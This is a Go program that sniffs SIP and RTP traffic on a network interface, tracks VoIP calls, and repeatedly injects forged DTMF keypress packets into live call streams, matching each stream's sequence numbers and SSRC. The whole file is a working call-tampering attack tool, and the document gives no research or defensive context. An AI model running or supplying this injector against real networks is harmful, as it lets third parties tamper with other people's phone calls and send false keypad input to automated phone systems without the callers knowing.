package main

import (
	"errors"
	"flag"
	"log"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/jart/gosip/rtp"
	"github.com/jart/gosip/sdp"
	"github.com/jart/gosip/sip"
)

var (
	iface             = flag.String("i", "wlan0", "Interface to listen on")
	dst               = flag.String("d", "", "Destination IP to filter by")
	injectionInterval = flag.Duration("t", 3*time.Second, "Time between injection attempts")
	sequence          = flag.Uint("s", 10, "Injection sequence offset (begin injecting packets at this sequence number)")
)

type RTPHeader struct {
	PT   uint8
	Seq  uint16
	TS   uint32
	SSRC uint32
}

type rtpStream struct {
	FirstSeen    time.Time
	LastInjected time.Time
	localPort    uint16
}

const (
	dtmfVolume   = 6
	dtmfDuration = 400
	dtmfInterval = 100
)

var (
	streams = map[uint32]*rtpStream{} // SSRC -> rtpStream
	calls   = map[string]uint16{}     // Call-ID -> local port
)

func sendDTMF(seq uint16, ts, ssrc uint32, txCallback func([]byte) error) error {
	header := rtp.Header{
		PT:   sdp.DTMFCodec.PT,
		Seq:  seq,
		TS:   ts,
		Ssrc: ssrc,
	}

	buf := make([]byte, 0, 1500)
	header.Mark = true
	var event [4]byte
	event[0] = 1 // DTMF digit 1
	event[1] = dtmfVolume & 0x3f
	dur := uint16(1)
	for {
		event[2] = byte(dur >> 8)
		event[3] = byte(dur & 0xff)
		if err := txCallback(append(header.Write(buf), event[:]...)); err != nil {
			return err
		}
		header.Seq++
		header.Mark = false
		dur += dtmfInterval
		if dur >= dtmfDuration {
			break
		}
	}
	event[1] |= 0x80
	event[2] = byte(dtmfDuration >> 8)
	event[3] = byte(dtmfDuration & 0xff)
	for n := 0; n < 3; n++ {
		header.Write(buf)
		if err := txCallback(append(header.Write(buf), event[:]...)); err != nil {
			return err
		}
		header.Seq++
	}
	return nil
}

func (h *RTPHeader) Read(b []byte) error {
	// RFC 1899 Version 2
	if u32(b[0:1]) != 0x80 {
		return errors.New("invalid RTP version header")
	}

	h.PT = uint8(u32(b[1:2]))
	h.Seq = uint16(u32(b[2:4]))
	h.TS = u32(b[4:8])
	h.SSRC = u32(b[8:12])

	return nil
}

// between gets the string between two substrings
func between(s, start, end string) string {
	sp := strings.Split(s, start)
	if len(sp) < 2 {
		return ""
	}
	return strings.Split(sp[1], end)[0]
}

// u32 converts a byte slice to a uint32
func u32(b []byte) uint32 {
	var u uint32
	for i := 0; i < len(b); i++ {
		u = u<<8 + uint32(b[i])
	}
	return u
}

func modifyAndInject(handle *pcap.Handle, pkt gopacket.Packet, payload []byte) error {
	*pkt.ApplicationLayer().(*gopacket.Payload) = payload
	if err := pkt.TransportLayer().(*layers.UDP).SetNetworkLayerForChecksum(pkt.NetworkLayer()); err != nil {
		return err
	}

	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	if err := gopacket.SerializePacket(buffer, options, pkt); err != nil {
		return err
	}

	return handle.WritePacketData(buffer.Bytes())
}

func main() {
	flag.Parse()

	log.Printf("Filtering by destination IP %s with injection sequence offset %d", *dst, *sequence)

	handle, err := pcap.OpenLive(*iface, 262144, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	if err := handle.SetBPFFilter("udp and dst " + *dst); err != nil {
		log.Fatal(err)
	}

	log.Printf("Starting capture on %s", *iface)
	for pkt := range gopacket.NewPacketSource(handle, handle.LinkType()).Packets() {
		// Decode UDP packet
		udp := pkt.Layer(layers.LayerTypeUDP)
		if udp == nil {
			continue
		}
		udpLayer := udp.(*layers.UDP)

		// Attempt to decode RTP packet
		var rtph RTPHeader
		if err := rtph.Read(udpLayer.Payload); err == nil {
			// Find call
			call := "[unknown]"
			for callID, rtpPort := range calls {
				if strconv.Itoa(int(rtpPort)) == udpLayer.SrcPort.String() {
					call = callID
					break
				}
			}

			// Check if stream seen
			if _, ok := streams[rtph.SSRC]; !ok {
				log.Printf("Tracking RTP stream (ssrc %d seq %d) with call %s", rtph.SSRC, rtph.Seq, call)
				streams[rtph.SSRC] = &rtpStream{
					FirstSeen: time.Now(),
				}
			}

			// Check if it has been at least N seconds since last packet injection
			stream := streams[rtph.SSRC]
			if rtph.Seq >= uint16(*sequence) &&
				(stream.LastInjected.IsZero() ||
					time.Since(stream.LastInjected) > *injectionInterval) {

				log.Printf(
					"Injecting DTMF tone [%s:%d -> %s:%d] SSRC %d call %s",
					pkt.NetworkLayer().NetworkFlow().Src(), udpLayer.SrcPort,
					pkt.NetworkLayer().NetworkFlow().Dst(), udpLayer.DstPort,
					rtph.SSRC,
					call,
				)

				if err := sendDTMF(rtph.Seq+1, rtph.TS, rtph.SSRC, func(b []byte) error {
					return modifyAndInject(handle, pkt, b)
				}); err != nil {
					log.Fatal(err)
				}
				stream.LastInjected = time.Now()
			}
		}

		// Attempt to decode SIP packet
		msg, err := sip.ParseMsg(udpLayer.Payload)
		if err == nil && msg.Payload != nil {
			// Parse RTP local port from SIP message payload
			rtpLocalPort, err := strconv.Atoi(between(string(msg.Payload.Data()), "m=audio ", " RTP/AVP"))
			if err == nil {
				// Register call if we haven't seen it before
				if _, ok := calls[msg.CallID]; !ok {
					log.Printf("Tracking call from %s [Call ID %s] RTP local port %d", msg.From, msg.CallID, rtpLocalPort)
					calls[msg.CallID] = uint16(rtpLocalPort)
				}
			}
		}
	}
}
